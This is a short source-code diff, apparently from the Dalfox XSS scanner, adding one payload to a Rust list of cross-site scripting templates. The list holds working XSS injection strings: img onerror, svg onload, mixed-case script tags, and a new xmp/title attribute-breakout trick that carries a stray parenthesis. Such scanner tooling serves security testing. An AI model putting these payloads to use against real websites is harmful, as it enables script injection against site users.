@@ -8,6 +8,7 @@ pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
         "<IMG src=x onerror={JS} class=dalfox>",
         "<sVg onload={JS} class=dalfox>",
         "<sCrIpt/class=dalfox>{JS}</scRipT>",
+        "<xmp><p title=\"</xmp><svg/onload={JS}) class=dalfox>",
         // ID
         "<IMG src=x onerror={JS} id=dalfox>",
         "<sVg onload={JS} id=dalfox>",
